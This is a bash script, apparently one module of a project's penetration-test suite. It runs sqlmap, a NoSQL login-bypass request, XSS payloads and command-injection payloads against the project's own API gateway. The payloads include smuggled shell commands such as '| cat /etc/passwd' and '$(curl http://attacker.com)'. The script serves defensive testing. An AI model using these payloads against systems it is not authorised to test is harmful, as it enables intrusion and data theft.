#!/bin/bash
# scripts/security/kali/modules/04-injection-tests.sh

set -uo pipefail

RESULTS_DIR="/pentest/results/injection"
mkdir -p "$RESULTS_DIR" "$RESULTS_DIR/sqlmap"

TARGET="${API_GATEWAY_URL:-http://api-gateway:3000}"
AUTH_TOKEN="${AUTH_TOKEN:-}"

log() { echo "[$(date +'%H:%M:%S')] $*"; }

# ------------------------------------------------------------------
# SQL Injection (sqlmap)
# ------------------------------------------------------------------
log "Starting SQL Injection tests..."

ENDPOINTS=(
    "/api/v1/users?search="
    "/api/v1/organizations?name="
    "/api/v1/audit/logs?event_type="
)

for endpoint in "${ENDPOINTS[@]}"; do
    log "Testing: $endpoint"

    # sqlmap returns non-zero when no injection is found; that is expected.
    # --ignore-code 401: keep testing even if token expires mid-scan.
    # IMPORTANT: use short-flag "-H" with a space (NOT --header=) because
    # sqlmap v1.10.2 has a parsing bug with --header= and long JWT values.
    if [ -n "$AUTH_TOKEN" ]; then
        sqlmap -u "$TARGET$endpoint" \
            --batch \
            --level=3 \
            --risk=2 \
            --technique=BEUSTQ \
            --threads=5 \
            --output-dir="$RESULTS_DIR/sqlmap" \
            --timeout=30 \
            --retries=1 \
            --ignore-code 401 \
            -H "Authorization: Bearer ${AUTH_TOKEN}" \
            2>&1 | tee -a "$RESULTS_DIR/sqlmap.log" || {
                log "sqlmap exited with code $? for $endpoint (expected if no injection found)"
            }
    else
        sqlmap -u "$TARGET$endpoint" \
            --batch \
            --level=3 \
            --risk=2 \
            --technique=BEUSTQ \
            --threads=5 \
            --output-dir="$RESULTS_DIR/sqlmap" \
            --timeout=30 \
            --retries=1 \
            2>&1 | tee -a "$RESULTS_DIR/sqlmap.log" || {
                log "sqlmap exited with code $? for $endpoint (expected if no injection found)"
            }
    fi
done

# ------------------------------------------------------------------
# NoSQL Injection
# ------------------------------------------------------------------
log "Testing NoSQL Injection..."

curl -s --max-time 10 -X POST "$TARGET/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email": {"$ne": null}, "password": {"$ne": null}}' \
    -w "\nStatus: %{http_code}\n" \
    >> "$RESULTS_DIR/nosql-injection.log" 2>&1 || true

# ------------------------------------------------------------------
# XSS
# ------------------------------------------------------------------
log "Testing XSS..."

XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "javascript:alert('XSS')"
    "<svg onload=alert('XSS')>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    safe_payload=$(echo "$payload" | sed 's/"/\\"/g')

    curl -s --max-time 10 -X POST "$TARGET/api/v1/users" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $AUTH_TOKEN" \
        -d "{\"first_name\": \"$safe_payload\", \"last_name\": \"Test\", \"email\": \"xss-test@test.com\"}" \
        -w "\nStatus: %{http_code}\n" \
        >> "$RESULTS_DIR/xss-test.log" 2>&1 || true
done

# ------------------------------------------------------------------
# Command Injection
# ------------------------------------------------------------------
log "Testing Command Injection..."

CMD_PAYLOADS=(
    "; ls -la"
    "| cat /etc/passwd"
    "\`whoami\`"
    "\$(curl http://attacker.com)"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    curl -s --max-time 10 -X POST "$TARGET/api/v1/notifications/send" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $AUTH_TOKEN" \
        -d "{\"webhook_url\": \"http://localhost$payload\"}" \
        -w "\nStatus: %{http_code}\n" \
        >> "$RESULTS_DIR/command-injection.log" 2>&1 || true
done

log "Injection tests complete. Results in $RESULTS_DIR"
